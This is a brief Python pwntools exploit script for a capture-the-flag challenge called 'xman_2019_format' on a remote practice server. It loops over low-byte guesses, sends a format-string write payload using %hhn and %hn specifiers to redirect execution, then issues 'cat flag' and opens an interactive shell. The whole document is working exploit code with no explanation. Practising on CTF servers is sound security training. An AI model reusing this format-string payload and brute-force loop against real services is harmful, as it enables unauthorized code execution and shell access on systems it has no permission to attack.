from pwn import *

# context.log_level='warn'

for x in range(4, 0x100, 4):
    tar = '%' + str(x) + 'c%10$hhn|%34219c%18$hn'
    try:
        # sh = process('./xman_2019_format')
        sh = remote('node3.buuoj.cn', 27180)
        log.info('current low byte:{}'.format(hex(x)))
        sh.recv()
        sh.sendline(tar)
        sh.recv(timeout=1)
        sleep(1)
        sh.sendline('cat flag')
        sh.recvline_contains('flag', timeout=1)
        sh.interactive()
    except:
        sh.close()
